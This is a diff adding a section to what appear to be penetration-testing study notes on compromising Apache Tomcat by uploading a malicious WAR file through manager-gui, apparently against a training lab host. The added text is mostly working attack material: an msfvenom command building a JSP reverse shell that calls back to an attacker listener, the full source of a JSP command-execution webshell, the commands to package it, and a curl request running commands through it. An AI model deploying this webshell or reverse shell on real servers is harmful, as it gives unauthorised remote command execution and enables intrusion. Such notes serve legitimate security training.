@@ -75,3 +75,53 @@ Uploading a WAR File:
 
 After we gain admin access to tomcat, we can usually visit manager-gui (given that the user we have access is not banned from it), we can upload a WAR application on it, which, in this sense of course is going to be a webshell or reverse shell, we are interested in the "WAR file to deploy" section in the photo listed below:
 ![[Pasted image 20260816014515.png]]
+
+We can use msfvenom to generate malicious WAR file that is actually a reverse shell: 
+```
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+```
+
+Or if we prefer webshell, we can also use something like this:
+```
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+
+#At terminal
+zip -r backup.war cmd.jsp 
+```
+
+After that we can use it like other webshell:
+```
+curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+```
